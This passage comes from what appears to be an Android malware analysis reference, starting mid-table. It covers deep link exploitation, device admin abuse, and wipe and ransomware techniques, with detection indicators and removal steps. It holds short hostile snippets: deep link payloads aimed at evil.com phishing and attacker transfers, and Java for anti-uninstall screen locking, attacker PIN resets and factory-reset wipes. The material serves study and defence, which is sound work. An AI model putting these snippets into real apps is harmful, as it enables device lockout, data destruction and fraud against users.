No Yes Yes No No Yes No TrickMo No Yes No No Yes No No Yes Yes FireScam Yes Yes Yes No No Yes No Yes No Rafel RAT Yes Yes Yes Yes No No No Yes Yes EagleMsgSpy Yes Yes Yes Yes Yes No No Yes Yes PJobRAT Yes Yes Yes Yes No No No Yes Yes KoSpy Yes Yes Yes Yes Yes Yes Yes Yes Yes PlainGnome Yes Yes Yes Yes Yes No No Yes Yes <p>State-sponsored spyware (Pegasus, Predator, Hermit, FinSpy) exfiltrates everything. Banking trojans focus on SMS/OTPs and device info. Loan apps (SpyLoan) target contacts and photos for extortion.</p>"},{"location":"attacks/data-exfiltration/#android-version-timeline","title":"Android Version Timeline","text":"Version API Change Impact on Data Exfiltration Android 6.0 23 Runtime permissions Contacts, SMS, call log, storage require user grant at runtime Android 7.0 24 <code>GET_ACCOUNTS</code> restricted Third-party account enumeration limited Android 8.0 26 Background execution limits Background services killed, affects continuous monitoring Android 10 29 Scoped storage, background location restrictions, clipboard restrictions File access limited to own sandbox, clipboard reading restricted to foreground Android 10 29 Non-resettable identifiers restricted IMEI, serial number inaccessible without <code>READ_PRIVILEGED_PHONE_STATE</code> Android 11 30 <code>MANAGE_EXTERNAL_STORAGE</code> for all-files access, package visibility filtering Full storage access requires special permission, installed app list requires <code>QUERY_ALL_PACKAGES</code> Android 12 31 Approximate location option, clipboard access toast, Bluetooth permissions split Users can grant coarse location only, clipboard reads visible to user Android 13 33 Granular media permissions, notification permission required, photo picker <code>READ_MEDIA_IMAGES</code>/<code>VIDEO</code>/<code>AUDIO</code> replace storage permission, photo picker limits access to selected files Android 14 34 Selected photos access, credential manager Users can grant access to specific photos only Android 15 35 Screen recording detection, enhanced privacy sandbox Apps can detect when they are being recorded"},{"location":"attacks/data-exfiltration/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>ContentResolver.query()</code> calls against <code>ContactsContract</code>, <code>content://sms</code>, <code>CallLog.Calls</code>, <code>MediaStore</code></li> <li><code>READ_CONTACTS</code>, <code>READ_SMS</code>, <code>READ_CALL_LOG</code>, <code>READ_EXTERNAL_STORAGE</code> in manifest</li> <li><code>MANAGE_EXTERNAL_STORAGE</code> in manifest (unusual for most legitimate apps)</li> <li><code>AccountManager.getAccounts()</code> usage</li> <li><code>ClipboardManager</code> with <code>OnPrimaryClipChangedListener</code></li> <li>File scanning methods targeting specific extensions (<code>.pdf</code>, <code>.doc</code>, <code>.wallet</code>, <code>.db</code>)</li> <li><code>TelephonyManager</code> calls for IMEI, IMSI, phone number</li> <li><code>Build.MODEL</code>, <code>Build.SERIAL</code>, <code>Build.MANUFACTURER</code> in device info collection blocks</li> <li>Base64 encoding applied to collected data before network transmission</li> <li>ZIP archive creation followed by HTTP upload</li> <li>References to <code>content://com.whatsapp.provider</code> or WhatsApp database paths</li> <li><code>MediaStore.Images</code> or <code>MediaStore.Video</code> queries with bulk iteration</li> </ul> Dynamic Indicators <ul> <li>Bulk <code>ContentResolver</code> queries immediately after permission grant</li> <li>Large outbound POST requests containing Base64-encoded data</li> <li>File system traversal of <code>/sdcard/</code> directories</li> <li>Network traffic containing device identifiers (IMEI patterns, Android ID)</li> <li>ZIP file creation in app cache directory followed by upload</li> <li>Clipboard listener registrations visible via <code>dumpsys clipboard</code></li> <li>Periodic data uploads on fixed intervals (every 5, 15, 30 minutes)</li> <li>WiFi-only upload behavior (exfiltration pauses on mobile data)</li> <li>Outbound requests to <code>api.telegram.org</code> containing document uploads</li> <li>Firebase Realtime Database writes with structured victim data</li> </ul>"},{"location":"attacks/deep-link-exploitation/","title":"Deep Link Exploitation","text":"<p>Abusing an app's URI scheme or App Link handling to trigger unintended behavior: opening internal activities, injecting parameters, stealing OAuth tokens, or redirecting the user to attacker-controlled content.</p> <p>Requirements</p> Requirement Details Permission None Condition Target app handles custom URI schemes or deep links without proper validation"},{"location":"attacks/deep-link-exploitation/#how-deep-links-work","title":"How Deep Links Work","text":"<p>Android apps register to handle URIs via intent filters:</p>"},{"location":"attacks/deep-link-exploitation/#custom-uri-schemes","title":"Custom URI Schemes","text":"<pre><code>&lt;activity android:name=\".DeepLinkActivity\" android:exported=\"true\"&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.intent.action.VIEW\" /&gt;\n        &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n        &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt;\n        &lt;data android:scheme=\"myapp\" android:host=\"action\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/activity&gt;\n</code></pre> <p>Any app can trigger this with <code>myapp://action/some-path</code>.</p>"},{"location":"attacks/deep-link-exploitation/#app-links-android-6","title":"App Links (Android 6+)","text":"<pre><code>&lt;intent-filter android:autoVerify=\"true\"&gt;\n    &lt;action android:name=\"android.intent.action.VIEW\" /&gt;\n    &lt;category android:name=\"android.intent.category.DEFAULT\" /&gt;\n    &lt;category android:name=\"android.intent.category.BROWSABLE\" /&gt;\n    &lt;data android:scheme=\"https\" android:host=\"example.com\" android:pathPrefix=\"/app\" /&gt;\n&lt;/intent-filter&gt;\n</code></pre> <p>App Links use HTTPS and require domain verification via <code>/.well-known/assetlinks.json</code>. When verified, the app handles the URL directly without a chooser dialog.</p>"},{"location":"attacks/deep-link-exploitation/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/deep-link-exploitation/#custom-scheme-hijacking","title":"Custom Scheme Hijacking","text":"<p>Custom URI schemes (<code>myapp://</code>, <code>mybank://</code>) are not verified. Any app can register an intent filter for the same scheme. If two apps handle <code>myapp://callback</code>, the system shows a chooser or picks one based on priority.</p> <p>This is critical for OAuth flows: if a banking app uses <code>mybank://oauth/callback?code=XXX</code> as its redirect URI, a malicious app registering the same scheme can intercept the authorization code.</p>"},{"location":"attacks/deep-link-exploitation/#webview-url-loading","title":"WebView URL Loading","text":"<p>If the target app loads deep link URLs into a WebView without sanitizing:</p> <pre><code>myapp://webview?url=https://evil.com/phishing.html\n</code></pre> <p>The app opens attacker-controlled content inside its own WebView, potentially with access to JavaScript interfaces or the app's cookie store. See WebView Exploitation.</p>"},{"location":"attacks/deep-link-exploitation/#intent-parameter-injection","title":"Intent Parameter Injection","text":"<p>Deep links often map URL parameters to intent extras:</p> <pre><code>myapp://transfer?to=attacker&amp;amount=1000\n</code></pre> <p>If the app doesn't validate the source of the intent, it may process this as a legitimate internal navigation.</p>"},{"location":"attacks/deep-link-exploitation/#app-link-verification-bypass","title":"App Link Verification Bypass","text":"<p>App Link verification depends on <code>/.well-known/assetlinks.json</code> being properly configured. If:</p> <ul> <li>The file is missing or misconfigured</li> <li>The app doesn't set <code>android:autoVerify=\"true\"</code></li> <li>Verification fails silently</li> </ul> <p>Then the link falls back to being a regular deep link (chooser dialog), and scheme hijacking applies.</p>"},{"location":"attacks/deep-link-exploitation/#fragment-path-traversal","title":"Fragment / Path Traversal","text":"<p>Some apps use the URI path to navigate internal screens:</p> <pre><code>myapp://screen/admin/settings\n</code></pre> <p>If path validation is weak, an attacker may reach internal activities not meant for external access.</p>"},{"location":"attacks/deep-link-exploitation/#real-world-cases","title":"Real-World Cases","text":"Target Vulnerability OAuth redirect hijacking Malicious app intercepts OAuth callback, steals authorization code, gains account access Banking app deep links Direct navigation to transfer screens with pre-filled parameters WebView-based apps URL parameter loads external content inside the app's WebView context Payment apps Deep links to payment confirmation screens with attacker-controlled amounts/recipients <p>8kSec's deep link and WebView exploitation guide provides a hands-on walkthrough using the InsecureShop vulnerable app, demonstrating URL validation bypass techniques such as verifying authority instead of full domain name, allowing suffix-based bypasses. Oversecured's research has documented deep link vulnerabilities across Google, Samsung, TikTok, and banking applications, often chaining deep link exploitation with content provider access or WebView loading for full compromise.</p>"},{"location":"attacks/deep-link-exploitation/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 6.0 (API 23) App Links with domain verification prevent scheme hijacking for HTTPS links Only protects HTTPS; custom URI schemes remain unverified Android 12 (API 31) Stricter App Link verification; unverified links open in browser by default Apps with misconfigured <code>assetlinks.json</code> or missing <code>autoVerify</code> fall back to chooser behavior Android 13 (API 33) Restricted settings prevent sideloaded apps from registering as default handlers Does not affect already-installed apps or Play Store-distributed malware"},{"location":"attacks/deep-link-exploitation/#families-using-this-technique","title":"Families Using This Technique","text":"Family Usage Details Vultur Malvertising via deep links Uses deep links in malvertising redirects to trigger APK downloads Brokewell Fake update pages Deep links route victims to fake Chrome update landing pages Hook C2-directed navigation Uses deep links to navigate victims to specific banking app screens <p>Deep link exploitation is more commonly observed in app-to-app vulnerability research than in standalone malware. Malware more typically abuses deep links as part of phishing delivery chains rather than as a primary attack technique.</p>"},{"location":"attacks/deep-link-exploitation/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li>Custom URI schemes (non-HTTPS) in intent filters</li> <li>Deep link handlers that pass URL parameters to WebView, database queries, or navigation logic without validation</li> <li>OAuth redirect URIs using custom schemes instead of App Links</li> <li>Missing <code>android:autoVerify=\"true\"</code> on HTTPS intent filters</li> <li>Absence of source validation in deep link handling activities</li> </ul> Dynamic Indicators <ul> <li>Intent delivery via <code>adb shell am start</code> triggering unexpected activity navigation</li> <li>URL parameters passed through to WebView without sanitization</li> <li>OAuth authorization codes leaked to non-target apps via scheme interception</li> </ul>"},{"location":"attacks/device-admin-abuse/","title":"Device Admin Abuse","text":"<p>Exploiting the Device Administration API to prevent app removal, lock the screen, or wipe the device. A device admin app cannot be uninstalled until the user manually deactivates it through Settings, which malware actively obstructs through UI manipulation and social engineering.</p> <p>See also: Device Wipe &amp; Ransomware, Persistence Techniques, Accessibility Abuse</p> <p>Requirements</p> Requirement Details Permission <code>BIND_DEVICE_ADMIN</code> declared in manifest Condition User must explicitly activate the app as device admin through a system prompt Component <code>DeviceAdminReceiver</code> subclass registered in manifest"},{"location":"attacks/device-admin-abuse/#how-it-works","title":"How It Works","text":""},{"location":"attacks/device-admin-abuse/#device-administration-api","title":"Device Administration API","text":"<p>The <code>DevicePolicyManager</code> API was designed for enterprise MDM (Mobile Device Management) solutions to enforce security policies on company devices. It grants elevated privileges: locking the screen, setting password requirements, encrypting storage, wiping the device, disabling the camera.</p> <p>Any app can request device admin status, but the user must explicitly approve it through a system-managed activation screen. Once activated, the app cannot be uninstalled until device admin is deactivated first.</p>"},{"location":"attacks/device-admin-abuse/#implementation","title":"Implementation","text":"<p>The malware declares a <code>DeviceAdminReceiver</code> and a device admin policy XML:</p> <pre><code>&lt;receiver\n    android:name=\".AdminReceiver\"\n    android:permission=\"android.permission.BIND_DEVICE_ADMIN\"\n    android:exported=\"true\"&gt;\n    &lt;meta-data\n        android:name=\"android.app.device_admin\"\n        android:resource=\"@xml/device_admin_policies\" /&gt;\n    &lt;intent-filter&gt;\n        &lt;action android:name=\"android.app.action.DEVICE_ADMIN_ENABLED\" /&gt;\n    &lt;/intent-filter&gt;\n&lt;/receiver&gt;\n</code></pre> <p>Policy XML (<code>res/xml/device_admin_policies.xml</code>):</p> <pre><code>&lt;device-admin&gt;\n    &lt;uses-policies&gt;\n        &lt;force-lock /&gt;\n        &lt;wipe-data /&gt;\n        &lt;reset-password /&gt;\n        &lt;limit-password /&gt;\n        &lt;disable-camera /&gt;\n        &lt;watch-login /&gt;\n    &lt;/uses-policies&gt;\n&lt;/device-admin&gt;\n</code></pre> <p>Programmatic activation request:</p> <pre><code>ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);\nIntent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);\nintent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);\nintent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,\n    \"Enable security features to protect your device\");\nstartActivity(intent);\n</code></pre>"},{"location":"attacks/device-admin-abuse/#attack-patterns","title":"Attack Patterns","text":""},{"location":"attacks/device-admin-abuse/#anti-uninstall-persistence","title":"Anti-Uninstall Persistence","text":"<p>The primary abuse case. Once activated as device admin, the app resists removal. If the user navigates to Settings &gt; Apps and tries to uninstall, Android displays \"This app is an active device administrator and must be deactivated before uninstalling.\"</p> <p>The user must go to Settings &gt; Security &gt; Device Administrators, find the app, and deactivate it. Malware blocks this in several ways:</p> <ul> <li>Accessibility overlay: monitors for the device admin settings screen and immediately navigates the user away or displays a blocking overlay</li> <li>Screen lock on deactivation attempt: the <code>onDisableRequested()</code> callback fires before deactivation, and the malware immediately locks the screen</li> <li>Repeated reactivation: if the user manages to deactivate, the malware immediately requests activation again via an aggressive loop of activation intents</li> </ul> Anti-Deactivation via Screen Lock <pre><code>public class AdminReceiver extends DeviceAdminReceiver {\n    @Override\n    public CharSequence onDisableRequested(Context context, Intent intent) {\n        DevicePolicyManager dpm = (DevicePolicyManager)\n            context.getSystemService(Context.DEVICE_POLICY_SERVICE);\n        dpm.lockNow();\n        return \"Deactivating will leave your device unprotected\";\n    }\n}\n</code></pre>"},{"location":"attacks/device-admin-abuse/#screen-lock-manipulation","title":"Screen Lock Manipulation","text":"<p>Forcing a PIN or password lock to hold the device hostage. The malware calls <code>lockNow()</code> to immediately lock the screen, or <code>resetPassword()</code> to set a new lock screen password the victim doesn't know.</p> <pre><code>DevicePolicyManager dpm = (DevicePolicyManager)\n    getSystemService(Context.DEVICE_POLICY_SERVICE);\nComponentName admin = new ComponentName(this, AdminReceiver.class);\n\ndpm.resetPassword(\"attacker_pin_1234\", 0);\ndpm.lockNow();\n</code></pre> <p><code>resetPassword()</code> was restricted in Android 7.0 (API 24) -- it can no longer change an existing password, only set one when none exists. Android 8.0+ (API 26) deprecated it entirely for device admins, moving this capability to Device Owner only.</p>"},{"location":"attacks/device-admin-abuse/#factory-reset-scorched-earth","title":"Factory Reset (Scorched Earth)","text":"<p>Wiping the entire device as anti-forensics or retaliation after completing fraud. <code>wipeData()</code> triggers a full factory reset with no user confirmation.</p> <pre><code>DevicePolicyManager dpm = (DevicePolicyManager)\n    getSystemService(Context.DEVICE_POLICY_SERVICE);\ndpm.wipeData(0);\n</code></pre> <p>BRATA performs a factory reset after completing a fraudulent bank transfer to destroy evidence. The victim loses all data, and forensic analysis of the device becomes impossible without chip-off techniques.</p>"},{"location":"attacks/device-admin-abuse/#camera-disabling","title":"Camera Disabling","text":"<p><code>setCameraDisabled()</code> prevents all apps from using the camera. Rarely used by malware, but observed in ransomware-style campaigns as an additional pressure tactic alongside screen locking.</p>"},{"location":"attacks/device-admin-abuse/#login-monitoring","title":"Login Monitoring","text":"<p><code>setMaximumFailedPasswordsForWipe()</code> configures automatic device wipe after N failed unlock attempts. Malware can set this to a low number (e.g., 3) so that a victim who forgot the attacker-set PIN inadvertently triggers a wipe.</p>"},{"location":"attacks/device-admin-abuse/#social-engineering-for-activation","title":"Social Engineering for Activation","text":"<p>The system activation dialog cannot be customized, but malware controls everything around it. Common approaches:</p> <ul> <li>Fake security app: presents as antivirus or system cleaner, tells the user admin access is required for \"full protection\"</li> <li>Fake system update: displays an urgent update notification that leads to the activation prompt</li> <li>Persistent nagging: shows the activation prompt repeatedly in a loop until the user complies, with accessibility service pressing Back being intercepted</li> <li>Misleading explanation: the <code>EXTRA_ADD_EXPLANATION</code> string displayed on the activation prompt is controlled by the malware. Phrased as a security necessity</li> </ul>"},{"location":"attacks/device-admin-abuse/#device-owner-vs-device-admin-vs-profile-owner","title":"Device Owner vs Device Admin vs Profile Owner","text":"Aspect Device Admin Device Owner Profile Owner Activation User grants via Settings ADB or NFC provisioning (factory-fresh only) MDM enrollment Removal User can deactivate Cannot be removed without factory reset User can remove managed profile Capabilities Lock, wipe, password policy Full device control, silent app install, kiosk mode Work profile isolation Malware Use Common (pre-Android 9) Rare (requires factory state) Not observed in malware API Level 8+ 21+ 21+ <p>Device Owner is strictly more powerful than Device Admin but requires provisioning on a factory-fresh device via <code>adb shell dpm set-device-owner</code> or NFC bump during setup wizard. Malware cannot achieve Device Owner status on a device the victim is already using.</p>"},{"location":"attacks/device-admin-abuse/#samsung-knox-abuse","title":"Samsung Knox Abuse","text":"<p>Samsung Knox provides additional enterprise APIs beyond stock Android. On Samsung devices, a Device Admin with Knox license can:</p> <ul> <li>Prevent USB debugging from being enabled</li> <li>Block installation from unknown sources at the system level</li> <li>Set a custom recovery message shown on the lock screen</li> <li>Control VPN configuration</li> <li>Prevent factory reset via hardware buttons</li> </ul> <p>Knox abuse has been observed in targeted attacks against enterprises using Samsung fleets. The attacker gains Knox admin rights and locks down the device more aggressively than standard Android APIs allow.</p>"},{"location":"attacks/device-admin-abuse/#android-mitigations","title":"Android Mitigations","text":"Version Mitigation Bypass Android 2.2 (API 8) Device Administration API introduced No restrictions on third-party use Android 5.0 (API 21) Device Owner and Profile Owner introduced (more powerful than basic device admin) Malware continues using basic device admin for anti-uninstall Android 7.0 (API 24) <code>resetPassword()</code> can no longer change an existing password Only works when no password is set Android 8.0 (API 26) <code>resetPassword()</code> deprecated for device admin; camera disable restricted Shift to accessibility for equivalent capabilities Android 9.0 (API 28) Device admin deprecation begins: <code>resetPassword()</code>, <code>setCameraDisabled()</code> deprecated for third-party apps Malware shifts to accessibility service abuse Android 10 (API 29) Device admin cannot set password quality requirements on devices with existing screen lock Anti-uninstall still works Android 14 (API 34) Deprecated policies actively blocked for apps targeting API 34+; most policy methods throw <code>SecurityException</code> Apps targeting lower API levels unaffected; anti-uninstall via admin activation still functional"},{"location":"attacks/device-admin-abuse/#modern-replacement-accessibility-service","title":"Modern Replacement: Accessibility Service","text":"<p>As device admin capabilities were deprecated, malware shifted to accessibility service abuse for the same goals:</p> Goal Device Admin Method Accessibility Replacement Prevent uninstall Admin activation blocks removal Navigate away from uninstall screen Lock screen <code>lockNow()</code> <code>GLOBAL_ACTION_LOCK_SCREEN</code> (API 28+) Intercept password <code>watchLogin</code> policy Keylogging via accessibility events Block Settings access Limited Full control over Settings navigation Persist on device Cannot remove active admin Cannot disable accessibility without navigating Settings <p>Accessibility service provides strictly more capability with fewer restrictions than device admin. The transition was complete by approximately 2020 -- modern families rarely bother with device admin.</p> <p>Device Admin is a Legacy Technique</p> <p>If you encounter device admin abuse in a sample dated 2021 or later, it is almost certainly a secondary mechanism alongside accessibility service abuse. Prioritize reversing the accessibility service component -- it will contain the core malicious logic.</p>"},{"location":"attacks/device-admin-abuse/#families-using-this-technique","title":"Families Using This Technique","text":"Family Device Admin Use Era BRATA Factory reset after fraud, anti-uninstall 2019-2022 Cerberus Anti-uninstall, screen lock on deactivation attempt 2019-2020 Anubis Screen lock (ransomware mode), anti-uninstall 2017-2020 BankBot Anti-uninstall persistence, primary defense mechanism 2016-2018 SpyNote Anti-uninstall, combined with accessibility 2020-present Ermac Anti-uninstall fallback alongside accessibility 2021-2022 Rafel RAT Screen lock for ransomware, device wipe 2022-present TrickMo Screen lock after credential theft 2020-2022 Hydra Anti-uninstall persistence 2019-2021 GodFather Legacy persistence, largely replaced by accessibility 2021-2022"},{"location":"attacks/device-admin-abuse/#deactivation-and-removal","title":"Deactivation and Removal","text":""},{"location":"attacks/device-admin-abuse/#via-adb","title":"Via ADB","text":"<p>If the device has USB debugging enabled, deactivate device admin remotely:</p> <pre><code>adb shell dpm remove-active-admin com.malware/.AdminReceiver\n</code></pre> <p>List all active device admins:</p> <pre><code>adb shell dumpsys device_policy\n</code></pre> <p>Force-stop and uninstall after deactivation:</p> <pre><code>adb shell am force-stop com.malware\nadb shell pm uninstall com.malware\n</code></pre>"},{"location":"attacks/device-admin-abuse/#via-safe-mode","title":"Via Safe Mode","text":"<p>Safe Mode Bypass</p> <p>Boot into Safe Mode (hold power button, long-press \"Power Off\" to get Safe Mode option). Third-party apps are disabled, which neutralizes the malware's accessibility service and overlay defenses. Navigate to Settings &gt; Security &gt; Device Administrators, deactivate the malware, then uninstall. This is the most reliable removal path when the malware blocks deactivation through UI manipulation.</p>"},{"location":"attacks/device-admin-abuse/#via-settings-if-possible","title":"Via Settings (If Possible)","text":"<p>Settings &gt; Security &gt; Device Administrators &gt; find the malware entry &gt; Deactivate. If the malware uses accessibility to block this, disable the accessibility service first under Settings &gt; Accessibility.</p>"},{"location":"attacks/device-admin-abuse/#detection-during-analysis","title":"Detection During Analysis","text":"Static Indicators <ul> <li><code>DeviceAdminReceiver</code> in manifest with <code>BIND_DEVICE_ADMIN</code> permission</li> <li>Policy XML requesting <code>wipe-data</code>, <code>force-lock</code>, or <code>reset-password</code></li> <li><code>DevicePolicyManager</code> API calls in decompiled code</li> <li><code>onDisableRequested()</code> override that performs blocking actions</li> </ul> Dynamic Indicators <ul> <li>App requesting device admin activation on first launch</li> <li>Screen locking when user navigates to device admin settings</li> <li><code>dpm</code> commands visible in logcat during admin operations</li> <li>Factory reset triggered after completing fraudulent transactions</li> </ul>"},{"location":"attacks/device-wipe-ransomware/","title":"Device Wipe &amp; Ransomware","text":"<p>Destroying data, locking devices, and encrypting files on Android for extortion or evidence destruction. Android ransomware has evolved from simple screen lockers (2013) through PIN-changing lockers to file-encrypting variants, while banking trojans adopted factory reset as a post-fraud cleanup technique to destroy forensic evidence.</p> <p>See also: Device Admin Abuse, Accessibility Abuse, Persistence Techniques</p> <p>Requirements</p> Requirement Details Factory reset <code>BIND_DEVICE_ADMIN</code> with <code>wipeData</code> policy, or root access PIN change <code>BIND_DEVICE_ADMIN</code> with <code>resetPassword</code> policy (pre-Android 8.0), or <code>BIND_ACCESSIBILITY_SERVICE</code> File encryption <code>READ_EXTERNAL_STORAGE</code> + <code>WRITE_EXTERNAL_STORAGE</code> (pre-Android 11), or <code>MANAGE_EXTERNAL_STORAGE</code> Screen lock <code>SYSTEM_ALERT_WINDOW</code> (overlay), or <code>BIND_DEVICE_ADMIN</code>, or <code>BIND_ACCESSIBILITY_SERVICE</code>"},{"location":"attacks/device-wipe-ransomware/#post-fraud-factory-reset","title":"Post-Fraud Factory Reset","text":"<p>Banking trojans use factory reset as an evidence destruction technique. After completing an unauthorized transfer, the malware wipes the device to eliminate forensic artifacts (SMS transaction confirmations, banking app logs, the malware itself).</p>"},{"location":"attacks/device-wipe-ransomware/#brata","title":"BRATA","text":"<p>BRATA (Brazilian Remote Access Tool, Android) pioneered post-fraud device wiping. Cleafy documented the behavior in January 2022: after completing a fraudulent wire transfer, BRATA executes a factory reset via <code>DevicePolicyManager.wipeData()</code> to remove all traces. The wipe also serves as a kill switch if the malware detects analysis (emulator, debugger, low number of installed apps).</p> <pre><code>DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);\ndpm.wipeData(DevicePolicyManager.WIPE_EXTERNAL_STORAGE);\n</code></pre>"},{"location":"attacks/device-wipe-ransomware/#bingomod","title":"BingoMod","text":"<p>BingoMod, documented by Cleafy in July 2024, follows BRATA's model with a self-destruction mechanism designed to eradicate traces of activity and hinder forensic analysis. BingoMod establishes a socket-based connection with C2 infrastructure to receive up to 40 commands remotely, including device wipe. The malware's functionality includes erasing external storage and can initiate complete factory resets through its remote access capabilities.</p>"},{"location":"attacks/device-wipe-ransomware/#other-families-with-wipe-capability","title":"Other Families with Wipe Capability","text":"Family Wipe Trigger Method Source BRATA Post-fraud or analysis detection <code>DevicePolicyManager.wipeData()</code> Cleafy BingoMod Post-fraud evidence destruction Remote wipe via C2 command Cleafy Cerberus C2 kill command Device admin wipe Malpedia Rafel RAT C2 command, ransomware module Device admin wipe + file encryption Check Point"},{"location":"attacks/device-wipe-ransomware/#android-ransomware-evolution","title":"Android Ransomware Evolution","text":"<p>ESET's whitepaper \"Android Ransomware: From Android Defender to DoubleLocker\" traces the complete history.</p>"},{"location":"attacks/device-wipe-ransomware/#screen-lockers-2013-2015","title":"Screen Lockers (2013-2015)","text":"<p>The earliest Android ransomware displayed persistent full-screen overlays that the user could not dismiss, demanding payment to \"unlock\" the device.</p> <p>Koler (April 2014): Police-themed ransomware that displayed a localized law enforcement warning based on the victim's geographic location. A US victim saw an FBI warning; European victims saw Europol branding. Distributed primarily through adult content sites. Demanded $100-$300 via MoneyPak. Infected approximately 200,000 Android devices, with 75% in the United States.</p> <p>Screen lockers used <code>SYSTEM_ALERT_WINDOW</code> to display persistent overlays. Early variants could be removed by booting into safe mode and uninstalling the app. More sophisticated variants registered as device administrators to resist uninstall.</p>"},{"location":"attacks/device-wipe-ransomware/#pin-lockers-2015-2017","title":"PIN Lockers (2015-2017)","text":"<p>LockerPin (September 2015): ESET discovered the first Android ransomware that changed the device's lock screen PIN using <code>DevicePolicyManager.resetPassword()</code>. Once the PIN was changed, even the malware authors could not unlock it without knowing the new randomly generated PIN. The only recovery options were factory reset (losing all data) or ADB access on a rooted/debug-enabled device to delete the PIN file.</p> <pre><code>DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);\ndpm.resetPassword(randomPin, DevicePolicyManager.RESET_PASSWORD_REQUIRE_ENTRY);\n</code></pre>"},{"location":"attacks/device-wipe-ransomware/#file-encryption-2014-present","title":"File Encryption (2014-Present)","text":"<p>Simplocker (June 2014): The first Android ransomware to actually encrypt files. Scanned external storage for media files (images, documents, video) and encrypted them with AES. Demanded ransom in Ukrainian hryvnia, indicating Ukrainian origin. C2 communication routed through Tor <code>.onion</code> addresses.</p> <p>DoubleLocker (October 2017): ESET documented the first Android ransomware combining both file encryption and PIN lock. Based on the Svpeng banking trojan's accessibility service code. DoubleLocker:</p> <ol> <li>Encrypted user files with AES</li> <li>Changed the device PIN to a random value</li> <li>Demanded 0.0130 BTC (~$54 at the time) within 24 hours</li> <li>Spread as a fake Adobe Flash Player update</li> <li>Reactivated its ransom screen every time the user pressed the Home button via accessibility service</li> </ol>"},{"location":"attacks/device-wipe-ransomware/#modern-ransomware-techniques","title":"Modern Ransomware Techniques","text":"<p>MalLocker.B (October 2020): Microsoft documented a novel screen locking technique that did not require <code>SYSTEM_ALERT_WINDOW</code> or device admin. MalLocker.B used two mechanisms in combination:</p> <ol> <li>Call notification abuse: Used the system \"call\" notification (normally for incoming calls) to display a window covering the entire screen</li> <li><code>onUserLeaveHint()</code> override: Intercepted Home and Recents button presses to relaunch the ransom screen, preventing the user from switching away</li> </ol> <p>This bypassed all previous platform mitigations against screen-locking ransomware because it used legitimate notification APIs rather than overlays or device admin policies.</p> <p>SOVA v5 (2022): Cleafy documented the addition of a ransomware module to the SOVA banking trojan. Version 5 uses AES encryption to lock all files on infected devices, appending the <code>.enc</code> extension. SOVA demonstrated the convergence of banking trojan and ransomware functionality: a single malware performing overlay attacks, cookie stealing, 2FA interception, VNC remote access, and file encryption.</p>"},{"location":"attacks/device-wipe-ransomware/#screen-lock-mechanisms","title":"Screen Lock Mechanisms","text":"Mechanism Android Versions Bypass <code>SYSTEM_ALERT_WINDOW</code> overlay All (restricted 6.0+) Safe mode boot, ADB uninstall Device admin <code>resetPassword()</code> Pre-8.0 (deprecated) Factory reset, ADB on rooted device Accessibility home button interception 7.0+ ADB uninstall, safe mode Call notification + <code>onUserLeaveHint()</code> 10+ ADB uninstall Accessibility service as home launcher 7.0+ ADB disable accessibility, safe mode"},{"location":"attacks/device-wipe-ransomware/#resetpassword-deprecation","title":"<code>resetPassword()</code> Deprecation","text":"<p>Android 8.0 (Oreo) deprecated <code>DevicePolicyManager.resetPassword()</code> for device admin apps. The method only works for device owner or profile owner apps (managed device scenarios). This eliminated the PIN-locking ransomware vector for non-rooted devices running Android 8.0+.</p> <p>However, accessibility-based approaches remain viable. Malware with accessibility service access can navigate to <code>Settings &gt; Security &gt; Screen Lock</code> and change the PIN through UI interaction, bypassing the API restriction entirely.</p>"},{"location":"attacks/device-wipe-ransomware/#scoped-storage-impact","title":"Scoped Storage Impact","text":"<p>Android 10 introduced scoped storage, and Android 11 enforced it. Apps can no longer freely access files on external storage without explicit user grants via <code>SAF</code> (Storage Access Framework) or <code>MANAGE_EXTERNAL_STORAGE</code> (restricted on Play Store).</p> Storage Model Ransomware Impact Pre-Android 10 <code>READ/WRITE_EXTERNAL_STORAGE</code> grants access to all shared files Android 10 (optional) Scoped storage opt-in; most apps still use legacy Android 11+ (enforced) Only app-private files accessible without <code>MANAGE_EXTERNAL_STORAGE</code> Android 11+ with <code>MANAGE_EXTERNAL_STORAGE</code> Full access, but Play Store restricts approval to file managers <p>Sideloaded ransomware can still request <code>MANAGE_EXTERNAL_STORAGE</code> and trick users into granting it. But the Play Store distribution vector for file-encrypting ransomware is effectively closed.</p>"},{"location":"attacks/device-wipe-ransomware/#families-by-capability","title":"Families by Capability","text":"Family Screen Lock PIN Change File Encryption Factory Reset Era Koler Overlay No No No 2014 Simplocker No No AES No 2014 LockerPin No Yes (<code>resetPassword</code>) No No 2015 DoubleLocker Accessibility Yes (<code>resetPassword</code>) AES No 2017 MalLocker.B Call notification No No No 2020 BRATA No No No <code>wipeData()</code> 2022 SOVA v5 No No AES (<code>.enc</code>) No 2022 BingoMod No No No Remote wipe 2024 Rafel RAT Overlay Yes AES <code>wipeData()</code> 2024"},{"location":"attacks/device-wipe-ransomware/#android-version-timeline","title":"Android Version Timeline","text":"Version Change Impact on Ransomware 4.0 Device admin API available <code>wipeData()</code> and <code>resetPassword()</code> accessible 5.0 SELinux enforcing Root-based wipe harder without exploit 6.0 <code>SYSTEM_ALERT_WINDOW</code> requires explicit grant (sideloaded) Overlay-based lockers need user interaction 7.0 <code>resetPassword()</code> requires current password if one is set PIN change harder if device already has PIN 8.0 <code>resetPassword()</code> deprecated for device admin PIN-locking ransomware vector eliminated for 8.0+ 9.0 Device admin deprecated for enterprise Fewer legitimate uses, easier to flag abuse 10 Scoped storage introduced (opt-in) File encryption scope reduced 11 Scoped storage enforced Ransomware cannot access shared files without <code>MANAGE_EXTERNAL_STORAGE</code> 12 <code>SYSTEM_ALERT_WINDOW</code> overlay restrictions Harder to maintain persistent full-screen lock 14 